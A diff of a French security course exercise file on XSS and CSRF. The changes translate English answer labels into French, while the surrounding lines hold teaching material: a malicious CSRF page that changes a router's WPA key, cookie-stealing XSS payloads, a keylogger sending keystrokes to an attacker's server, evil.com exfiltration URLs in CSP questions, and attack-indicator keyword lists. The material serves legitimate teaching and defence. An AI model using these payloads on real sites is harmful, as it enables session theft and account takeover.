@@ -5,7 +5,7 @@ sidebar_position: 5
 
 # Exercices -- XSS et CSRF
 
-> Following teacher instructions from: S6/Vulnerabilites/data/moodle/guide/03_xss_csrf.md
+> Conforme aux consignes du cours : S6/Vulnerabilites/data/moodle/guide/03_xss_csrf.md
 > Source du cours : 2026 CSRF XSS.pdf
 
 ---
@@ -23,7 +23,7 @@ sidebar_position: 5
 | `/scripts/admin.php.bak` | INFO | Fichier de sauvegarde expose (reconnaissance, exploration) |
 | `/images/lo%67o.png` | INFO | Encodage URL (`%67` = `g`), simple exploration |
 
-**Answer:**
+**Reponse :**
 
 Methode systematique pour identifier le type d'attaque :
 
@@ -31,11 +31,11 @@ Methode systematique pour identifier le type d'attaque :
 Indices --> XSS :   <script>, <img onerror, alert(, javascript:, <svg onload, <SCRipt>
 Indices --> SQL :   UNION, SELECT, OR 1=1, '--, #, ORDER BY, information_schema
 Indices --> CMD :   ;, |, ||, &&, commandes shell (echo, cat, rm, sleep, /bin/*)
-Indices --> CSRF :  URL d'action modificatrice sans token/confirmation
-Indices --> INFO :  .bak, .old, .log, .env, exploration de chemins, path traversal
+Indices --> CSRF :  URL d'action modificatrice sans jeton/confirmation
+Indices --> INFO :  .bak, .old, .log, .env, exploration de chemins, traversee de repertoires
 ```
 
-**Security explanation:**
+**Explication de securite :**
 
 L'identification du type d'attaque est la premiere etape de la reponse a incident. Chaque type d'attaque a des contre-mesures specifiques : echappement des sorties pour XSS, requetes preparees pour SQL, whitelist pour CMD, tokens anti-CSRF pour CSRF.
 
@@ -50,7 +50,7 @@ GET http://192.168.0.1/WPA.php?key=91B8A3
 
 ### Q1 : Construisez une page malicieuse qui change la cle WPA de la victime
 
-**Answer:**
+**Reponse :**
 
 ```html noexec
 <html>
@@ -74,7 +74,7 @@ Trace d'execution :
 
 ### Q2 : Construisez une page malicieuse pour la methode POST
 
-**Answer:**
+**Reponse :**
 
 Si le routeur utilise POST au lieu de GET :
 ```html noexec
@@ -100,7 +100,7 @@ Trace d'execution :
 
 ### Q3 : Comment proteger le routeur ?
 
-**Answer:**
+**Reponse :**
 
 | Protection | Mecanisme | Efficacite |
 |-----------|-----------|-----------|
@@ -109,7 +109,7 @@ Trace d'execution :
 | Verification Referer | Verifier que le header Referer vient du meme domaine | Moyenne -- peut etre supprime ou forge |
 | Confirmation mot de passe | Demander le mot de passe actuel avant tout changement | Forte -- l'attaquant ne connait pas le mot de passe |
 
-**Security explanation:**
+**Explication de securite :**
 
 Le CSRF exploite la confiance du serveur dans le navigateur de la victime. Le navigateur joint automatiquement les cookies, donc toute requete envoyee depuis le navigateur est authentifiee. La meilleure protection est `SameSite=Strict` sur les cookies d'authentification, combinee avec un token anti-CSRF.
 
@@ -126,7 +126,7 @@ echo "Resultats de recherche pour : " . $_GET['q'];
 
 ### Q1 : Donnez une URL qui execute du JavaScript
 
-**Answer:**
+**Reponse :**
 
 ```
 /search.php?q=<script>alert(document.cookie)</script>
@@ -145,7 +145,7 @@ Trace d'execution :
 
 ### Q2 : Comment voler le cookie de session de la victime ?
 
-**Answer:**
+**Reponse :**
 
 **Payload avec evenement d'erreur (discret) :**
 ```
@@ -178,7 +178,7 @@ Permet de charger un script complet depuis le serveur de l'attaquant.
 
 ### Q3 : Variante avec contournement de filtre
 
-**Answer:**
+**Reponse :**
 
 Si l'application filtre `<script>` :
 ```
@@ -198,7 +198,7 @@ Si le HTML est filtre mais pas les attributs :
 
 ### Q4 : Corrigez le code
 
-**Answer:**
+**Reponse :**
 
 ```php noexec
 <?php
@@ -218,9 +218,9 @@ Resultats de recherche pour : &lt;script&gt;alert(document.cookie)&lt;/script&gt
 
 Le navigateur affiche le texte tel quel, sans executer de JavaScript.
 
-**Security explanation:**
+**Explication de securite :**
 
-Le principe fondamental anti-XSS est : **"Never trust an output!"** Contrairement a l'injection SQL ou on protege l'entree (input), en XSS on protege la sortie (output) envoyee au navigateur. Il faut echapper TOUTES les sorties qui contiennent des donnees utilisateur.
+Le principe fondamental anti-XSS est : **"Ne jamais faire confiance a une sortie !"** Contrairement a l'injection SQL ou on protege l'entree, en XSS on protege la sortie envoyee au navigateur. Il faut echapper TOUTES les sorties qui contiennent des donnees utilisateur.
 
 ---
 
@@ -230,7 +230,7 @@ Le principe fondamental anti-XSS est : **"Never trust an output!"** Contrairemen
 
 ### Q1 : Quelle est la difference avec un XSS reflete ?
 
-**Answer:**
+**Reponse :**
 
 | Critere | XSS reflete | XSS stocke |
 |---------|-------------|------------|
@@ -241,7 +241,7 @@ Le principe fondamental anti-XSS est : **"Never trust an output!"** Contrairemen
 
 ### Q2 : Montrez une exploitation avec keylogger distant
 
-**Answer:**
+**Reponse :**
 
 L'attaquant poste le commentaire suivant :
 ```html noexec
@@ -256,7 +256,7 @@ Trace d'execution :
 5. Le script s'execute dans le contexte de securite du forum
 6. Le keylogger enregistre toutes les frappes clavier de la victime
 7. Les frappes sont envoyees au serveur de l'attaquant
-8. Si la victime se connecte, l'attaquant capture ses credentials
+8. Si la victime se connecte, l'attaquant capture ses identifiants
 
 Contenu possible de keylogger.js :
 ```javascript noexec
@@ -267,7 +267,7 @@ document.addEventListener('keypress', function(e) {
 
 ### Q3 : Quelles protections implementer ?
 
-**Answer:**
+**Reponse :**
 
 **Protection 1 -- Echapper les sorties (obligatoire) :**
 ```php noexec
@@ -308,7 +308,7 @@ Rejeter ou nettoyer les balises HTML dans les commentaires avec une whitelist de
 
 ### Q1 : Montrez qu'une XSS DOM-based est possible
 
-**Answer:**
+**Reponse :**
 
 **Payload (dans le fragment URL) :**
 ```
@@ -327,7 +327,7 @@ Trace d'execution :
 
 ### Q2 : Corrigez le code
 
-**Answer:**
+**Reponse :**
 
 **Correction : `textContent` au lieu de `innerHTML`**
 ```javascript noexec
@@ -337,7 +337,7 @@ document.getElementById('welcome').textContent = 'Bonjour ' + name;
 
 `textContent` traite la valeur comme du texte brut, jamais comme du HTML. Les balises sont affichees telles quelles sans etre interpretees.
 
-**Security explanation:**
+**Explication de securite :**
 
 Les trois types de XSS sont :
 - **Reflete** : le code est dans l'URL/requete, le serveur le "reflete" dans la reponse. Necessite que la victime clique sur un lien.
@@ -350,7 +350,7 @@ Les trois types de XSS sont :
 
 ### Remplissez le tableau comparatif
 
-**Answer:**
+**Reponse :**
 
 | Aspect | XSS | CSRF |
 |--------|-----|------|
@@ -360,7 +360,7 @@ Les trois types de XSS sont :
 | Le code s'execute dans le navigateur ? | Oui (JS dans le contexte de la page) | Non (juste une requete HTTP automatique) |
 | Cible principale | Le **navigateur** de la victime | Le **serveur** via le navigateur de la victime |
 | Protection principale | Echapper les sorties + CSP | SameSite + token anti-CSRF |
-| Principe de protection | "Never trust an output" | "Verifier l'origine de la requete" |
+| Principe de protection | "Ne jamais faire confiance a une sortie" | "Verifier l'origine de la requete" |
 
 **Point cle :** un XSS peut etre utilise pour realiser un CSRF (car le script injecte peut soumettre des formulaires), mais un CSRF ne peut pas realiser un XSS (il n'injecte pas de code).
 
@@ -374,7 +374,7 @@ Les trois types de XSS sont :
 Content-Security-Policy: script-src 'self' https://cdn.trusted.com; style-src 'self'; img-src *; object-src 'none'
 ```
 
-**Answer:**
+**Reponse :**
 
 | Directive | Signification |
 |----------|---------------|
@@ -385,7 +385,7 @@ Content-Security-Policy: script-src 'self' https://cdn.trusted.com; style-src 's
 
 ### Q2 : Un attaquant injecte `<script>alert('xss')</script>`. Que se passe-t-il ?
 
-**Answer:**
+**Reponse :**
 
 Le script **inline** est bloque par la CSP. La directive `script-src` ne contient pas `'unsafe-inline'`. Le navigateur affiche :
 ```
@@ -395,7 +395,7 @@ Content Security Policy directive: "script-src 'self' https://cdn.trusted.com"
 
 ### Q3 : L'attaquant essaie `<script src="http://evil.com/bad.js"></script>`. Resultat ?
 
-**Answer:**
+**Reponse :**
 
 Le domaine `evil.com` n'est pas dans la whitelist. Le script est bloque :
 ```
@@ -405,7 +405,7 @@ Content Security Policy directive: "script-src 'self' https://cdn.trusted.com"
 
 ### Q4 : L'attaquant essaie `<img src="http://evil.com/track?c=cookie">`. Resultat ?
 
-**Answer:**
+**Reponse :**
 
 L'image est **autorisee** car `img-src *` autorise toutes les sources d'images. L'attaquant peut exfiltrer des donnees via des requetes d'images. `img-src *` est dangereux car il permet l'exfiltration de donnees meme si la CSP bloque les scripts.
 
@@ -418,7 +418,7 @@ L'image est **autorisee** car `img-src *` autorise toutes les sources d'images. 
 Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600
 ```
 
-**Answer:**
+**Reponse :**
 
 | Flag | Role | Protection contre |
 |------|------|------------------|
@@ -445,7 +445,7 @@ Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3
 
 ### Q1 : Identifiez les vulnerabilites potentielles
 
-**Answer:**
+**Reponse :**
 
 **Recherche (XSS reflete) :**
 Si l'entree n'est pas echappee :
@@ -472,7 +472,7 @@ Si le formulaire n'a pas de token anti-CSRF :
 
 ### Q2 : Proposez les corrections
 
-**Answer:**
+**Reponse :**
 
 ```
 1. Recherche : htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8')
@@ -481,7 +481,7 @@ Si le formulaire n'a pas de token anti-CSRF :
 4. Global   : CSP script-src 'self' + HttpOnly cookies + SameSite=Strict
 ```
 
-**Security explanation:**
+**Explication de securite :**
 
 Le CSRF sur le changement d'email est plus grave qu'il n'y parait : si l'attaquant change l'email de la victime, il peut ensuite utiliser "mot de passe oublie" pour prendre le controle total du compte.
 
